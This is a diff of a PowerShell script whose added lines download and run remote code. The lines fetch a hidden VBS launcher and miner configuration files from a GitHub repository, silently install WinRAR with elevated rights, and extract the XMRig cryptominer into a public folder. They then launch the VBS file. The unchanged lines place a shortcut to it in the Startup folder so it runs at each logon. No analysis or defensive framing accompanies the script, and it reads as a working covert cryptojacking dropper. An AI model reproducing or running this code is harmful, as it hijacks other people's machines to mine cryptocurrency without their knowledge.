@@ -1,3 +1,14 @@
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/hid.vbs' -OutFile 'C:\Users\Public\Downloads\hid.vbs'
+Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\Users\Public\Downloads\winrar-x64-701.exe'
+Start-Process -FilePath 'C:\Users\Public\Downloads\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
+Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip' -OutFile 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip'
+& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'
+Start-Sleep -Seconds 2
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/COINRUN.cmd' -OutFile 'C:\Users\Public\Downloads\COINRUN.cmd'
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/config.json' -OutFile 'C:\Users\Public\Downloads\config.json'
+Copy-Item -Path 'C:\Users\Public\Downloads\COINRUN.cmd' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd' -Force
+Copy-Item -Path 'C:\Users\Public\Downloads\config.json' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\config.json' -Force
+Start-Process -FilePath 'C:\Users\Public\Downloads\hid.vbs'
 $source = "C:\Users\Public\Downloads\hid.vbs"
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hid.vbs.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
